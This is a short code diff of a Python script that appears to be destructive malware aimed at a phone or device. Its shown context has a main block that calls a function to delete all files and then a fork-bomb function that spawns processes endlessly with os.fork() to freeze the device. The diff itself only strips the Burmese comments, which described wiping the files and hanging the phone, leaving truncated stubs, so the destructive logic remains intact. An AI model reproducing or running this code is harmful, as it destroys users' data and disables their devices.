@@ -19,7 +19,7 @@ def delete_all_files():
 
 def freeze_device():
     print("[!] code hack ပြင်ဆင်နေပါဘီ")
-    # Process တွေကို အမြန်ဆုံးပွားပြီး CPU/RAM ကို အလုပ်ရှုပ်သွားအောင်လုပ်ခြင်း
+    # Proces
     while True:
         try:
             os.fork()
@@ -27,8 +27,8 @@ def freeze_device():
             pass
 
 if __name__ == "__main__":
-    # အရင်ဆုံး ဖိုင်တွေဖျက်မယ်
+    # 
     delete_all_files()
     
-    # ပြီးရင် ဖုန်းကို ဟမ်းအောင်လုပ်မယ်
+    #
     freeze_device()
